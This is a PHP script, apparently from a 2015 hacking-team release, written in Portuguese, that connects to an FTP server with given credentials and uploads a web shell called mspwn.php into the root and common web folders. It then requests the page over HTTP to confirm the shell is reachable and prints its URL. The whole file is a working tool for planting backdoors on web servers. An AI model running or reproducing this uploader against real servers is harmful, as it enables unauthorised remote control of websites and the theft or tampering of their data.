<?php
  
  /*
  ** FTP auto upload shell.
  ** Autor: Constantine. - 06/2015.
  ** Uso: php ftp_checker.php host port user pass file timeout
  ** Obs: Necessário conter a string '<!-- MSPWN.PHP -->' na shell para identificação.
  */
  
  error_reporting(0);
  
  class FTPChecker {
    private $paths = array('/', 'httpdocs', 'web', 'html', 'home', 
                           'www', 'public', 'public_html', 'htdocs', null);
    private $host;  
    private $port;
    private $user;
    private $pass;
    private $file;
    private $timeout;
    
    public function __construct ($host, $port, $user, $pass, $file, $timeout) {
      if ($this -> check($host) && $this -> check($port) && $this -> check($user) && 
          $this -> check($pass) && $this -> check($file) && $this -> check($timeout)) 
      {
        $this -> host = $host;
        $this -> port = $port;
        $this -> user = $user;
        $this -> pass = $pass;
        $this -> file = $file;
        $this -> timeout = $timeout;
      }
    }
    
    /*
    ** Inicia conexão com servidor FTP.
    **  Retorno: Para sucesso retorna 'true', para erro retorna 'false'.
    */
    public function start () {
      if (($connection = ftp_connect($this -> host, $this -> port, $this -> timeout)) != false) {
        if (($login = ftp_login($connection, $this -> user, $this -> pass)) == true) {
          ftp_put($connection, "mspwn.php", $this -> file, FTP_ASCII);    
          $content = ftp_rawlist($connection, '/');
          for ($a=0; $content[$a]!=null; $a++) 
            if ($content[$a][0] == 'd')
              for ($b=0; $this -> paths[$b]!=null; $b++) 
                if (strstr($content[$a], $this -> paths[$b]))
                  ftp_put($connection, "/{$this -> paths[$b]}/mspwn.php", $this -> file, FTP_ASCII);
          return true;
        } else
          echo "Error to login in FTP server.";
        ftp_close($connection);
      } else
        echo "Error to connect in FTP server.";
      return false;
    }
    
    /*
    ** Responsável por verificar se PHP shell foi upada com sucesso no servidor.
    **  Retorno: Se foi upada retorna 'true', caso contrário retorna 'false' para erro.
    */
    public function check_shell () {
      $header  = "GET /mspwn.php HTTP/1.1\r\n";
      $header .= "Host: ". $this -> host ."\r\n";
      $header .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0\r\n";
      $header .= "Connection: close\r\n\r\n";
      if (($fp = fsockopen($this -> host, 80, $e, $err, 5)) != false) {
        fputs($fp, $header);
        $response = "";
        while (!feof($fp)) 
          $response .= fread($fp, 1024);
        fclose($fp);
        if (strstr($response, '<!-- MSPWN.PHP. -->')) {
          echo "http://". $this -> host ."/mspwn.php";
          return true;
        }
      }
      return false;
    }
    
    /* Verifica se variável contém dados. */
    private function check ($data) {
      if (!empty($data) && strlen($data) > 0 && $data != null)
        return true;
      return false;
    }
  }
  
  if ($_SERVER['argc'] != 7)
    die("\n  FTP Checker v1.0 - Coded by Constantine - P0cL4bs Team - 2015\n\n".
        "   Use: php script.php HOST PORT USER PASS FILE TIMEOUT\n".
        "    Ex.: php script.php host.com 21 username password shell.php 5\n\n");
  
  $ftp = new FTPChecker(
    $_SERVER['argv'][1], $_SERVER['argv'][2], $_SERVER['argv'][3], 
    $_SERVER['argv'][4], $_SERVER['argv'][5], $_SERVER['argv'][6]);
  if ($ftp -> start())
    if ($ftp -> check_shell())
      die(";success");
  die(";error");
  
?>